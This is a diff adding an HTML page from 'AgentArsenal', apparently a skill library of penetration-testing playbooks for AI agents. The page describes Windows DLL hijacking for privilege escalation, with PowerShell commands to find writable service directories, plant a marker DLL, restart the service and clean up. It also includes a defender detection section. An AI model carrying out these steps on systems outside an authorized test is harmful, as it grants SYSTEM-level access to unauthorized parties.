@@ -1,0 +1,190 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>AgentArsenal: dll-hijacking</title>
+<style>
+:root {
+  --bg: #0d1117;
+  --panel: #161b22;
+  --border: #30363d;
+  --text: #e6edf3;
+  --muted: #8b949e;
+  --accent: #58a6ff;
+  --green: #3fb950;
+  --yellow: #d29922;
+  --red: #f85149;
+}
+* { box-sizing: border-box; }
+body {
+  background: var(--bg);
+  color: var(--text);
+  font-family: system-ui, -apple-system, "Segoe UI", Roboto, sans-serif;
+  margin: 0;
+  line-height: 1.6;
+}
+.wrap { max-width: 1100px; margin: 0 auto; padding: 1.5rem; }
+header.site {
+  border-bottom: 1px solid var(--border);
+  background: var(--panel);
+}
+header.site .wrap { display: flex; align-items: center; gap: 1.5rem; flex-wrap: wrap; }
+header.site h1 { font-size: 1.25rem; margin: 0; }
+header.site h1 a { color: var(--text); text-decoration: none; }
+nav a { color: var(--accent); text-decoration: none; margin-right: 1rem; }
+nav a:hover { text-decoration: underline; }
+table { width: 100%; border-collapse: collapse; margin-top: 1rem; }
+th, td { border: 1px solid var(--border); padding: 0.55rem 0.75rem; text-align: left; vertical-align: top; }
+th { background: var(--panel); }
+tbody tr:hover { background: rgba(88, 166, 255, 0.06); }
+a { color: var(--accent); }
+.muted { color: var(--muted); }
+.badge {
+  display: inline-block;
+  padding: 0.12rem 0.6rem;
+  border-radius: 999px;
+  font-size: 0.8rem;
+  font-weight: 600;
+  white-space: nowrap;
+}
+.badge.green { background: rgba(63, 185, 80, 0.12); color: var(--green); border: 1px solid var(--green); }
+.badge.yellow { background: rgba(210, 153, 34, 0.12); color: var(--yellow); border: 1px solid var(--yellow); }
+.badge.red { background: rgba(248, 81, 73, 0.12); color: var(--red); border: 1px solid var(--red); }
+.badge.gray { background: rgba(139, 148, 158, 0.12); color: var(--muted); border: 1px solid var(--muted); }
+#filter {
+  width: 100%;
+  max-width: 28rem;
+  padding: 0.6rem 0.8rem;
+  margin-top: 1rem;
+  background: var(--panel);
+  border: 1px solid var(--border);
+  border-radius: 6px;
+  color: var(--text);
+  font-size: 1rem;
+}
+pre {
+  background: var(--panel);
+  border: 1px solid var(--border);
+  border-radius: 6px;
+  padding: 1rem;
+  overflow-x: auto;
+}
+code { font-family: ui-monospace, SFMono-Regular, Menlo, Consolas, monospace; font-size: 0.9em; }
+pre code { font-size: 0.85rem; }
+p code, li code, td code {
+  background: rgba(88, 166, 255, 0.1);
+  border: 1px solid var(--border);
+  border-radius: 4px;
+  padding: 0.05rem 0.35rem;
+}
+.meta { display: flex; gap: 0.75rem; flex-wrap: wrap; margin: 1rem 0; align-items: center; }
+.deps { margin: 0.5rem 0; }
+.deps span.kind { color: var(--muted); font-size: 0.85rem; margin-right: 0.4rem; }
+.deps a { margin-right: 0.5rem; }
+h2 { border-bottom: 1px solid var(--border); padding-bottom: 0.4rem; }
+footer { border-top: 1px solid var(--border); margin-top: 2rem; padding: 1rem 0; color: var(--muted); font-size: 0.85rem; }
+.legend { display: flex; gap: 1.5rem; flex-wrap: wrap; margin: 1rem 0; color: var(--muted); font-size: 0.9rem; }
+.legend svg { vertical-align: middle; margin-right: 0.4rem; }
+.graph-note { color: var(--muted); font-size: 0.9rem; }
+</style>
+</head>
+<body>
+<header class="site">
+<div class="wrap">
+<h1><a href="../index.html">AgentArsenal</a></h1>
+<nav>
+<a href="../index.html">Skills</a>
+<a href="../index.html#agents">Agents</a>
+<a href="../index.html#brains">Brains</a>
+<a href="../index.html#playbooks">Playbooks</a>
+<a href="../index.html#decisions">Decisions</a>
+<a href="../graph.html">Dependency graph</a>
+</nav>
+</div>
+</header>
+<main class="wrap">
+<p><a href="../index.html">&larr; All skills</a></p><h2>dll-hijacking</h2><div class="meta"><span class="badge gray">privesc</span><span class="muted">v1.0.0</span><span class="badge green">stable</span><span class="badge green">95/100</span><span class="muted">verified 2026-10-23</span></div><p>Use when you have a Windows shell on an authorized engagement</p><div class="deps"><span class="kind">sub-skill of:</span> <a href="privesc-windows.html">privesc-windows</a></div><div class="deps"><span class="kind">requires:</span> <a href="privesc-windows.html">privesc-windows</a></div><div class="deps"><span class="kind">extends:</span> <span class="muted">none</span></div><div class="deps"><span class="kind">relates:</span> <a href="privesc-linux.html">privesc-linux</a></div><h2>Tools</h2><table><thead><tr><th>Tool</th><th>Version</th></tr></thead><tbody><tr><td>PowerShell</td><td>7.4</td></tr><tr><td>Python</td><td>3.12</td></tr></tbody></table><p>DLL hijacking plants a malicious library where a privileged process looks for one: missing DLLs, writable application directories, and unsafe search order all create the opening. This skill covers finding hijackable DLL loads on authorized engagements and proving them with a benign DLL. It is quieter than service binary replacement and works against both services and scheduled tasks.</p>
+<h2>Quick Workflow</h2>
+<ol>
+<li>Find privileged processes that load DLLs from interesting locations.</li>
+<li>Identify missing DLLs (NAME NOT FOUND) and writable directories in the</li>
+<p>search order.</p>
+<li>Verify the loading process runs as SYSTEM or an admin.</li>
+<li>Craft a proof DLL that writes a marker on load.</li>
+<li>Plant it with approval and trigger the load.</li>
+<li>Confirm the marker and remove the DLL.</li>
+</ol>
+<h2>1. Finding hijackable loads</h2>
+<pre><code class="language-powershell"># Services with binaries in writable directories are prime candidates
+Get-CimInstance Win32_Service | Select-Object Name, PathName, StartName |
+  Where-Object { $_.PathName -like &#x27;*Program Files*&#x27; }
+
+# Check the application directory writability for a candidate service
+$svcDir = &#x27;C:\Program Files\VulnApp&#x27;
+(Get-Acl $svcDir).Access | Where-Object {
+  $_.IdentityReference -like &#x27;*Users*&#x27; -and $_.FileSystemRights -like &#x27;*Write*&#x27; }
+
+# On a lab replica, ProcMon shows the exact missing DLL:
+# Filter: Process Name = service.exe, Result = NAME NOT FOUND, Path ends .dll</code></pre>
+<p>The ideal case is a SYSTEM service whose directory you can write to and which tries to load a DLL that does not exist. Your DLL with that exact name gets loaded at the next service start.</p>
+<h2>2. Search order weaknesses</h2>
+<pre><code class="language-powershell"># Check the system DLL search order configuration
+reg query &quot;HKLM\SYSTEM\CurrentControlSet\Control\Session Manager&quot; /v SafeDllSearchMode
+
+# Application directory comes first in the default order, which is why
+# writable app directories are the main target
+
+# Phantom DLL check: strings on the service binary for LoadLibrary calls
+# without full paths (do this on a copied binary in your lab)</code></pre>
+<p><code>SafeDllSearchMode</code> on (the default since XP SP2) still puts the application directory first. The defense that matters is the ACL on that directory, not the search order.</p>
+<h2>3. Proof DLL and trigger</h2>
+<pre><code class="language-bash"># Build a minimal DLL that writes a marker on load (on your attack box)
+# DllMain -&gt; CreateFile/WriteFile C:\dll_proof.txt, then return TRUE
+# Compile with: x86_64-w64-mingw32-gcc -shared -o hijack.dll hijack.c</code></pre>
+<pre><code class="language-powershell"># Plant as the missing DLL name in the writable directory (with approval)
+copy C:\Users\test\hijack.dll &#x27;C:\Program Files\VulnApp\missing.dll&#x27;
+
+# Trigger: restart the service or wait for its schedule
+sc.exe stop &quot;VulnService&quot;; sc.exe start &quot;VulnService&quot;
+
+# Confirm the marker, then remove the DLL immediately
+type C:\dll_proof.txt
+del &#x27;C:\Program Files\VulnApp\missing.dll&#x27;; del C:\dll_proof.txt</code></pre>
+<p>Keep the DLL minimal and side-effect free: write the marker and exit. A crashing DLL in a SYSTEM service is an availability incident, not a finding.</p>
+<h2>Edge cases</h2>
+<ul>
+<li>The DLL loads but as the wrong user. Check the service account; a</li>
+<p>NETWORK SERVICE load is still progress (lateral movement), not the SYSTEM win.</p>
+<li>DLL signing or allow-listing blocks your DLL. Note the control as a</li>
+<p>positive finding for that application.</p>
+<li>The directory is writable but the service never restarts. Note it as</li>
+<p>reboot-dependent, or look for a trigger (scheduled task, admin action).</p>
+<li>Multiple candidate DLLs exist. Plant one at a time and test; planting</li>
+<p>several confuses the diagnosis when something loads.</p>
+</ul>
+<h2>Escalation</h2>
+<ul>
+<li>No hijackable loads: return to the privesc-windows order;</li>
+<p>unquoted-service-paths and token-impersonation have higher hit rates.</p>
+<li>You need the exact missing DLL name: replicate the application in a</li>
+<p>lab and run ProcMon there; guessing names on production wastes the window.</p>
+<li>The hijack works but you need persistence: persistence is a separate</li>
+<p>decision with separate approval; prove privesc first.</p>
+</ul>
+<h2>Detection and defender view</h2>
+<p>Defenders see DLL hijacking as a new DLL in an application directory (FIM alert) and a privileged process loading an unsigned or unexpected library (Sysmon ImageLoad events, EDR). Defenses are locked-down application directory ACLs, DLL signing requirements, Sysmon monitoring of ImageLoad for unsigned DLLs in privileged processes, and removing phantom DLL dependencies from the software itself.</p>
+<h2>Key references</h2>
+<ul>
+<li>MITRE ATT&amp;CK T1574.001 (Hijack Execution Flow: DLL Search Order</li>
+<p>Hijacking).</p>
+<li>MITRE ATT&amp;CK T1574.002 (Hijack Execution Flow: DLL Side-Loading).</li>
+<li>CWE-427 (Uncontrolled Search Path Element).</li>
+<li>Microsoft documentation on DLL search order.</li>
+</ul>
+</main>
+<footer class="wrap">
+<p>AgentArsenal docs. Generated 2026-10-23.</p>
+</footer>
+</body>
+</html>
